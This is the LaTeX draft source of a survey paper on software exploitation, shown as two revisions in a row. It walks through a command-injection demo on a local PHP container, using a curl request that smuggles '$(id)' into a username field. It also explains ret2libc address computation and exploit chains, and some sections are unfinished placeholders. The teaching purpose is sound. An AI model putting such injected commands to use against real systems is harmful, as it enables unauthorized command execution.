Exploatarea Software și Mai Departe: Dezvăluirea Vectorilor de Atac și Contra-Măsurilor în Calculul Modern / Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing

### 2023-06-22 paper.tex
meme2

\documentclass{article}
\usepackage{tikz}
\usetikzlibrary{matrix,shapes,arrows,positioning,decorations.pathreplacing}
\usepackage{comment}
\usepackage{marginnote}
\usepackage{pgf}
\usepackage{xstring}
\usepackage{listings}
\usepackage{xcolor}

@@

\section{Abstract}%

Software exploitation continues to pose a significant threat to global
cybersecurity, with vulnerabilities in software systems offering fertile ground
for cyberattacks. The expanding complexity of contemporary software and the
incessantly evolving threat landscape only accentuates the magnitude of the
problem. This paper will discuss the concept of software exploitation,
elaborating on how attackers leverage vulnerability in software systems,
illustrating some common exploitation techniques including buffer overflows,
code injection, heap corruption, among others, while also exploring contemporary
exploit detection and prevention methodologies, from static and dynamic analysis
techniques to machine learngin and artificial intelligence-based approaches,
critically evaluating theirs strengths and weaknesses. Finally showcasing the
necessity for a proactive approach towards software security, outlining the
importance of secure coding practices and threat modeling in the early stages of
software development lifecycle. In conclusion this paper aims to offer an
in-depth review of the current landscape of exploitation, detection and
mitigation methodologies and techniques, emphasizing the criticality of these
techniques in fortifying software against threats.

@@

We will be walking through the following\ref{veziphpbapula} vulnerable PHP app.
The application lacks proper input validation and allows an attacker to execute
arbitrary commands. The use of the \emph{system} function will cause the following
process to execute \texttt{sh -c ``echo Hello <username>''}. Our\ref{poggeroni}
malicious request sets the \emph{username} parameter to \verb|$(id)|. Because
the original command executes in a shell environment, the shell will interpret
this string by forking itself and executing the string in between the braces and
replacing the original string with the result of the command. We can imagine that
we can cause havoc on the vulnerable machine by being able to execute any command
we want.

@@

\begin{lstlisting}[caption={Command Injection example}
      ,label={lst:bof}
      ,language=bash]
$ docker run -d -p 8080:80 command_injection_php
d58498277e1194cc46dac4009f8fca1c84ce02bea21008075ad53f77bd63202f
$ curl http://127.0.0.1:8080/hello\?username\=$\(id\)
Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)
\end{lstlisting}

Command injection vulnerabilities can drastically undermine security measures. They enable attackers to bypass reverse proxies, offering unauthorized access to protected internal services. Moreover, such vulnerabilities can assist in creating botnets by allowing threat actors to inject commands to download and install malicious software, leading to potential large-scale cyber threats such as Distributed Denial of Service (DDoS) attacks.

The situation is similar in the systems programming space. The example for how 
a vulnerable program might look is left as an exercise to the reader.
\subsection{Evolution}
\begin{comment}
  ret2libc
  Mention the lack of mitigation
  Rise of heap based exploits due to browsers and JS
  Research some linux&windows kernel exploits
\end{comment}
\subsection{State of the art}
\begin{comment}
  Rise of the hypervizor exploits (showcase some virtualbox exploits, maybe
  vmware hyperv) RCE Exploits mostly slowing down Common techniques no longer
  being effective (check offbyonesec talk about windows kernel exploitation, talk
  about)
\end{comment}

>>>>

\documentclass{article}
\usepackage{tikz}
\usetikzlibrary{matrix,shapes,arrows,positioning,decorations.pathreplacing,arrows.meta}
\usepackage{comment}
\usepackage{marginnote}
\usepackage{pgf}
\usepackage{xstring}
\usepackage{listings}
\usepackage{xcolor}

@@

\title{Exploatarea Software și Mai Departe: Dezvăluirea Vectorilor de Atac și Contra-Măsurilor în Calculul Modern / Software Exploitation and Beyond: Unveiling Attack Vectors and Countermeasures in Modern Computing}
\maketitle
\section{Abstract}%

Software exploitation continues to pose a significant threat to global
cybersecurity, with vulnerabilities in software systems offering fertile ground
for cyberattacks. The expanding complexity of contemporary software and the
incessantly evolving threat landscape only accentuates the magnitude of the
problem. This paper will discuss the concept of software exploitation,
elaborating on how attackers leverage vulnerability in software systems,
illustrating some common exploitation techniques including buffer overflows,
code injection, heap corruption, among others, while also exploring contemporary
exploit detection and prevention methodologies, from static and dynamic analysis
techniques to machine learning and artificial intelligence-based approaches,
critically evaluating theirs strengths and weaknesses. Finally showcasing the
necessity for a proactive approach towards software security, outlining the
importance of secure coding practices and threat modeling in the early stages of
software development lifecycle. In conclusion this paper aims to offer an
in-depth review of the current landscape of exploitation, detection and
mitigation methodologies and techniques, emphasizing the criticality of these
techniques in fortifying software against threats.

@@

We will be walking through the following\ref{veziphpbapula} vulnerable PHP app.
The application lacks proper input validation and allows an attacker to execute
arbitrary commands. The use of the \emph{system} function will cause the
following process to execute \texttt{sh -c ``echo Hello
<username>''}\footnote{There are situations where we are not able to inject
parameters into a command that will be directly reflected in the page. In these
situations we can try to end the intended command by using a \emph{;} character
and then write our own malicious command after.}. Our\ref{poggeroni} malicious
request sets the \emph{username} parameter to \verb|$(id)|. Because
the original command executes in a shell environment, the shell will interpret
this string by forking itself and executing the string in between the braces and
replacing the original string with the result of the command. We can imagine that
we can cause havoc on the vulnerable machine by being able to execute any command
we want.

@@

\begin{lstlisting}[caption={Command Injection example}
      ,label={lst:bof}
      ,language=bash]
$ docker run -d -p 8080:80 command_injection_php
d58498277e1194cc46dac4009f8fca1c84ce02bea21008075ad53f77bd63202f
$ curl http://127.0.0.1:8080/hello\?username\=$\(id\)
Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)
\end{lstlisting}
Command injection vulnerabilities can drastically undermine security measures.
They enable attackers to bypass reverse proxies, offering unauthorized access to
protected internal services. Moreover, such vulnerabilities can assist in
creating botnets by allowing threat actors to inject commands to download and
install malicious software, leading to potential large-scale cyber threats such
as Distributed Denial of Service (DDoS) attacks.

The situation is similar in the systems programming space. The example for how a vulnerable program might look is left as an exercise to the reader.
\subsection{Evolution}
\begin{comment} ret2libc

  Mention the lack of mitigation
  Rise of heap based exploits due to browsers and JS
  Research some linux&windows kernel exploits
\end{comment}
As mitigation strategies have advanced in both hardware and software to
counteract software exploitation, so too have the techniques used by threat
actors, resulting in a continual escalation of sophistication. In response to
hardening mechanisms such as stack canaries and NX bits, novel exploitation
techniques have been developed to circumvent these defenses. Prominent among
these are Return Oriented Programming (ROP) and heap corruption exploits. ROP is
a technique that leverages existing code fragments, known as "gadgets", in the
binary to perform arbitrary computations, effectively sidestepping the
constraints enforced by the NX bit. Heap corruption exploits, on the other hand,
involve manipulating the metadata of memory management structures to induce
undefined behavior, providing the means to execute arbitrary code or escalate
privileges. This evolutionary process underscores the dynamic nature of the
cybersecurity landscape and the perpetual challenge of maintaining software
security in the face of evolving threats.

\subsubsection{ret2libc}
\emph{ret2libc} or \emph{Return to LibC} is a countermove against the
NX bit mitigation, which marks certain areas of memory as non-executable,
thereby prohibiting the execution of injected code. The essence of ret2libc lies
in its ingenious manipulation of the control flow of the program to call
existing code, typically functions residing in standard libraries (hence
'libc'), rather than introducing new code to be executed. By returning into
standard, broadly-used functions like 'system()' or 'exec()', an attacker can
execute arbitrary commands in the context of the vulnerable program, effectively
bypassing the NX bit defense. Ret2libc exemplifies the continually evolving
landscape of software exploitation techniques that repurposes legitimate elements
of the program to nefarious ends, circumventing protective mechanisms and
illustrating the challenges of
developing robust and enduring defenses against software vulnerabilities.

The entry mechanism behind this technique is the same as in the code injection
case. We overwrite the return address of the program with an address we control,
but this time instead of providing our own shellcode we use existing code mapped
inside the address space of the vulnerable process (usually from within the
binary itself or LibC\footnote{LibC is mapped in almost all processes running on
a system}).

For example we could overwrite the return address of a function with the address
of the \emph{system} function. When actually implementing this kind of attack
we face 2 difficult problems:
\begin{enumerate}
  \item At what address is the function we want to call located
  \item How can we control the parameters that we pass to the function.
\end{enumerate}

We will assume that we already identified an exploitable buffer overflow and a
way to leak an known arbitrary address from within LibC. Now we want to call
the \emph{system} function with the `sh' string to grant us a foothold on the
machine. Here\ref{memes} is an example of how the virtual memory space looks
when executing a binary. The \emph{system} function is located in the text
section\footnote{Briefly explain sections} of LibC. If LibC is compiled with PIC
and ASLR is enabled on the target system, sections will be placed offset
relative to a randomly selected base address. Using the information disclosure
vulnerability to leak an address\footnote{Libc meme} we can compute the base
address of the library and from there be able to get addresses for any byte
in the library.

Let's say that we managed to leak the address of the \emph{printf} function and
have the LibC binary that is running on the system. We can get the base address at
which the library is mapped using this formula.
\begin{equation}
  libc\_{base} = printf\_leak - offset\_{of}\_{printf}\_{in}\_{libc}
\end{equation}

Now that we have the first issue fixed, how do we pass parameters to the functions
we want to call? Because the NX (No-Execute) bit

    % Define matrix
    \matrix [matrix of nodes,
      nodes=block,
      column sep=0cm,
      row sep=0cm
    ] (stack) {
      {\verb|<unmapped space>|}\\
      |[fill=red!20]|
      {binary.rodata} \\
      {binary.text} \\
      {binary.bss} \\
      {\verb|<unmapped space>|} \\
      |[fill=red!20]|
      {libc.rodata} \\
      {libc.text} \\
      {libc.bss} \\
      {\verb|<unmapped space>|} \\
      |[fill=red!20]|
      {ld.rodata} \\
      {ld.text} \\
      {ld.bss} \\
      {\verb|<unmapped space>|}\\
    };

    \draw [blue,thick,->] ([xshift=-3cm]stack-1-1.north west) --
    ([xshift=0cm]stack-1-1.north west) node[midway, below, black] {0x00000000};

    \draw [blue,thick,->] ([xshift=-3cm]stack-13-1.south west) --
    ([xshift=0cm]stack-13-1.south west) node[midway, below, black] {0xFFFFFFFF};

  \end{tikzpicture}
  \caption{\label{fig:label} Virtual memory map}%
  \label{fig:stackframe}
\end{figure}

\subsection{Exploit chains}
At this point in time the mitigation strategies employed by hardware and
software designers have limited the impact we have when executing a single
exploit. This has given the rise to \emph{exploit chains}. In this scenario
multiple vulnerabilities or oversights are exploited in order to gain more and
more information about the system. Here\ref{memes} is how an attacker would
approach the task of exploiting a system.

\begin{minipage}{\textwidth}
  \centering
  \begin{tikzpicture}[
    node distance = 2.5cm,
    auto,
    decision/.style={diamond, draw, fill=blue!20, text width=4.5em, text badly centered, node distance=3cm, inner sep=0pt, minimum width=5},
    block/.style={rectangle, draw, fill=blue!20, text width=5em, text centered, rounded corners, minimum height=4em},
    line/.style={draw, -Latex, rounded corners=5mm}
    ]

    \node [block] (entrypoint) {Entrypoint};
    \node [block, below of=entrypoint] (information) {Gain more information about the system};
    \node [decision, below of=information] (decision) {Enough info?};
    \node [block, below of=decision] (rce) {Goal};

    \path [line] (entrypoint) -- (information);
    \path [line] (information) -- (decision);
    \path [line] (decision) -- node {yes} (rce);
    \path [line] (decision) -- ++(-2,0) -- ++(0,2) node [midway, above, sloped,
    rotate=270, above=0.3cm] {no} -- (information);
  \end{tikzpicture}
\end{minipage}

\subsection{Browser exploits}

\begin{comment}
Cool decision tree
\end{comment}

\subsection{State of the art}
\begin{comment}
  Rise of the hypervizor exploits (showcase some virtualbox exploits, maybe
  vmware hyperv) RCE Exploits mostly slowing down Common techniques no longer
  being effective (check offbyonesec talk about windows kernel exploitation, talk
  about)
\end{comment}
